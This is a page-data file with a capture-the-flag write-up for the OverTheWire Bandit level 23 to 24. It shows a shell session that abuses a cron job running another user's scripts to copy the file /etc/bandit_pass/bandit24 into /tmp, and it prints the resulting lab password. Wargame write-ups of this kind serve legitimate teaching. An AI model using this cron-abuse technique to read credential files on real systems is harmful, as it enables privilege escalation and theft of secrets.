{"componentChunkName":"component---src-templates-blog-post-js","path":"/over_the_wire/Bandit/Bandit23-24/explanation/","result":{"data":{"markdownRemark":{"html":"<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">bandit23@bandit:~$ <span class=\"token builtin class-name\">cd</span> /etc/cron.d/\nbandit23@bandit:/etc/cron.d$ <span class=\"token function\">ls</span>\natop  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24\nbandit23@bandit:/etc/cron.d$ <span class=\"token function\">cat</span> cronjob_bandit24\n@reboot bandit24 /usr/bin/cronjob_bandit24.sh <span class=\"token operator\">&amp;></span> /dev/null\n* * * * * bandit24 /usr/bin/cronjob_bandit24.sh <span class=\"token operator\">&amp;></span> /dev/null\nbandit23@bandit:/etc/cron.d$ <span class=\"token function\">cat</span> /usr/bin/cronjob_bandit24.sh\n<span class=\"token comment\">#!/bin/bash</span>\n\n<span class=\"token assign-left variable\">myname</span><span class=\"token operator\">=</span><span class=\"token variable\"><span class=\"token variable\">$(</span><span class=\"token function\">whoami</span><span class=\"token variable\">)</span></span>\n\n<span class=\"token builtin class-name\">cd</span> /var/spool/<span class=\"token variable\">$myname</span>\n<span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"Executing and deleting all scripts in /var/spool/<span class=\"token variable\">$myname</span>:\"</span>\n<span class=\"token keyword\">for</span> <span class=\"token for-or-select variable\">i</span> <span class=\"token keyword\">in</span> * .*<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">do</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">[</span> <span class=\"token string\">\"<span class=\"token variable\">$i</span>\"</span> <span class=\"token operator\">!=</span> <span class=\"token string\">\".\"</span> -a <span class=\"token string\">\"<span class=\"token variable\">$i</span>\"</span> <span class=\"token operator\">!=</span> <span class=\"token string\">\"..\"</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">then</span>\n        <span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"Handling <span class=\"token variable\">$i</span>\"</span>\n        <span class=\"token function\">timeout</span> -s <span class=\"token number\">9</span> <span class=\"token number\">60</span> ./<span class=\"token variable\">$i</span>\n        <span class=\"token function\">rm</span> -f ./<span class=\"token variable\">$i</span>\n    <span class=\"token keyword\">fi</span>\n<span class=\"token keyword\">done</span>\n\n\nbandit23@bandit:/etc/cron.d$ <span class=\"token function\">mkdir</span> /tmp/bernardotest\nbandit23@bandit:/etc/cron.d$ <span class=\"token function\">chmod</span> <span class=\"token number\">777</span> /tmp/bernardotest\nbandit23@bandit:/etc/cron.d$ <span class=\"token function\">ls</span> -la /tmp/bernardotest\ntotal <span class=\"token number\">305924</span>\ndrwxrwxrwx <span class=\"token number\">2</span> bandit23 root      <span class=\"token number\">4096</span> Apr <span class=\"token number\">17</span> <span class=\"token number\">21</span>:47 <span class=\"token builtin class-name\">.</span>\ndrwxrws-wt <span class=\"token number\">1</span> root     root <span class=\"token number\">313204736</span> Apr <span class=\"token number\">17</span> <span class=\"token number\">21</span>:48 <span class=\"token punctuation\">..</span>\nbandit23@bandit:/etc/cron.d$ <span class=\"token function\">ls</span>\natop  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24\nbandit23@bandit:/etc/cron.d$ <span class=\"token function\">ls</span>\natop  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24\nbandit23@bandit:/etc/cron.d$ <span class=\"token builtin class-name\">cd</span> /var/spool/\nbandit24/ cron/     mail/     rsyslog/\nbandit23@bandit:/etc/cron.d$ <span class=\"token builtin class-name\">cd</span> /var/spool/bandit24/\nbandit23@bandit:/var/spool/bandit24$ <span class=\"token function\">ls</span>\nls: cannot <span class=\"token function\">open</span> directory <span class=\"token string\">'.'</span><span class=\"token builtin class-name\">:</span> Permission denied\nbandit23@bandit:/var/spool/bandit24$ <span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"cat /etc/bandit_pass/bandit24 > /tmp/bernardotest/totallynotthepass.txt\"</span> <span class=\"token operator\">></span> script.sh\nbandit23@bandit:/var/spool/bandit24$ <span class=\"token function\">cat</span> script.sh\n<span class=\"token function\">cat</span> /etc/bandit_pass/bandit24 <span class=\"token operator\">></span> /tmp/bernardotest/totallynotthepass.txt\nbandit23@bandit:/var/spool/bandit24$\nbandit23@bandit:/var/spool/bandit24$ <span class=\"token function\">cat</span> script.sh\n<span class=\"token function\">cat</span> /etc/bandit_pass/bandit24 <span class=\"token operator\">></span> /tmp/bernardotest/totallynotthepass.txt\nbandit23@bandit:/var/spool/bandit24$ <span class=\"token function\">cat</span> /tmp/bernardotest/totallynotthepass.txt\ncat: /tmp/bernardotest/totallynotthepass.txt: No such <span class=\"token function\">file</span> or directory\nbandit23@bandit:/var/spool/bandit24$ <span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"cat /etc/bandit_pass/bandit24 > /tmp/bernardotest/totallynotthepass.txt\"</span> <span class=\"token operator\">></span> script.sh\nbandit23@bandit:/var/spool/bandit24$ <span class=\"token function\">chmod</span> <span class=\"token number\">777</span> script.sh\nbandit23@bandit:/var/spool/bandit24$ <span class=\"token function\">cat</span> script.sh\n<span class=\"token function\">cat</span> /etc/bandit_pass/bandit24 <span class=\"token operator\">></span> /tmp/bernardotest/totallynotthepass.txt\nbandit23@bandit:/var/spool/bandit24$ <span class=\"token function\">cat</span> script.sh\ncat: script.sh: No such <span class=\"token function\">file</span> or directory\nbandit23@bandit:/var/spool/bandit24$ <span class=\"token function\">cat</span> /tmp/bernardotest/totallynotthepass.txt\nUoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ</code></pre></div>","frontmatter":{"title":""}}},"pageContext":{"isCreatedByStatefulCreatePages":false,"slug":"/over_the_wire/Bandit/Bandit23-24/explanation/"}}}